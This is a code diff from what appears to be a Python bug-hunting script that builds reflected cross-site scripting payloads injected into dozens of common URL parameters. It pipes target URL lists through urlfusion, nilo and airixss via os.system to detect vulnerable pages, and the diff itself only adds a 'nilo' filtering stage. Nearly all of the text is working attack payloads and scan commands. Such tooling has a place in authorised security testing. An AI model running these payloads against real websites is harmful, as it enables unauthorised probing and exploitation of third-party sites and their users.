@@ -11,10 +11,10 @@ payload_xss_2 = "?id=%27%22><img src=x onerror=alert(1)>&user=%27%22><img src=x 
 payload_xss_3 = "?redirect=%27%22><img src=x onerror=alert(1)>&return=%27%22><img src=x onerror=alert(1)>&url=%27%22><img src=x onerror=alert(1)>&link=%27%22><img src=x onerror=alert(1)>&next=%27%22><img src=x onerror=alert(1)>&callback=%27%22><img src=x onerror=alert(1)>&referrer=%27%22><img src=x onerror=alert(1)>&referer=%27%22><img src=x onerror=alert(1)>&target=%27%22><img src=x onerror=alert(1)>&destination=%27%22><img src=x onerror=alert(1)>&returnurl=%27%22><img src=x onerror=alert(1)>&return_uri=%27%22><img src=x onerror=alert(1)>&return_path=%27%22><img src=x onerror=alert(1)>&returnto=%27%22><img src=x onerror=alert(1)>&return_to=%27%22><img src=x onerror=alert(1)>"
 payload_xss_4 = "?page=%27%22><img src=x onerror=alert(1)>&view=%27%22><img src=x onerror=alert(1)>&section=%27%22><img src=x onerror=alert(1)>&module=%27%22><img src=x onerror=alert(1)>&component=%27%22><img src=x onerror=alert(1)>&task=%27%22><img src=x onerror=alert(1)>&action=%27%22><img src=x onerror=alert(1)>&option=%27%22><img src=x onerror=alert(1)>&format=%27%22><img src=x onerror=alert(1)>&tmpl=%27%22><img src=x onerror=alert(1)>&layout=%27%22><img src=x onerror=alert(1)>&lang=%27%22><img src=x onerror=alert(1)>&language=%27%22><img src=x onerror=alert(1)>&charset=%27%22><img src=x onerror=alert(1)>&stylesheet=%27%22><img src=x onerror=alert(1)>&script=%27%22><img src=x onerror=alert(1)>&js=%27%22><img src=x onerror=alert(1)>"
 
-execucao_xss_1 = "cat "+urls+"|urlfusion "+payload_xss_1+" |airixss -payload '=alert(1)>' | grep -Ev 'Not'"
-execucao_xss_2 = "cat "+urls+"|urlfusion "+payload_xss_2+" |airixss -payload '=alert(1)>' | grep -Ev 'Not'"
-execucao_xss_3 = "cat "+urls+"|urlfusion "+payload_xss_3+" |airixss -payload '=alert(1)>' | grep -Ev 'Not'"
-execucao_xss_4 = "cat "+urls+"|urlfusion "+payload_xss_4+" |airixss -payload '=alert(1)>' | grep -Ev 'Not'"
+execucao_xss_1 = "cat "+urls+"|urlfusion "+payload_xss_1+" |nilo|airixss -payload '=alert(1)>' | grep -Ev 'Not'"
+execucao_xss_2 = "cat "+urls+"|urlfusion "+payload_xss_2+" |nilo|airixss -payload '=alert(1)>' | grep -Ev 'Not'"
+execucao_xss_3 = "cat "+urls+"|urlfusion "+payload_xss_3+" |nilo|airixss -payload '=alert(1)>' | grep -Ev 'Not'"
+execucao_xss_4 = "cat "+urls+"|urlfusion "+payload_xss_4+" |nilo|airixss -payload '=alert(1)>' | grep -Ev 'Not'"
 
 os.system(execucao_xss_1)
 os.system(execucao_xss_2)
